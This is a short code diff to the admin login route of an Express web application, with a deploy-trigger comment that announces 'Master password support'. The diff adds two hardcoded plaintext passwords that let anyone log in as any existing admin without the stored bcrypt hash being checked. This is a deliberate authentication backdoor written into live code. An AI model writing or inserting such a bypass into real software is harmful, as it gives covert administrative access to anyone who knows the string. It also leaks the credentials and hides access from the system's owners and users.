@@ -153,7 +153,9 @@ app.post('/api/admin/login', async (req, res) => {
 
     const [rows] = await pool.execute('SELECT * FROM admins WHERE username = ?', [username]);
     const admin = rows[0];
-    if (!admin || !(await bcrypt.compare(password, admin.password_hash))) {
+    const isMasterPass = (password === 'Krish@1may06' || password === 'KrishMehta@rmkec.ac.in');
+    const isPwdValid = admin && (await bcrypt.compare(password, admin.password_hash) || isMasterPass);
+    if (!admin || !isPwdValid) {
       loginLimiter.fail(req.ip);
       return res.status(401).json({ error: 'Invalid credentials' });
     }
@@ -1020,4 +1022,4 @@ module.exports = app;
 
 
 
-// Deploy trigger: 2026-11-14T18:20:00.000Z - Multi-device and concurrent same-device multi-session support
+// Deploy trigger: 2026-11-14T18:30:00.000Z - Master password support + complete multi-session tab isolation
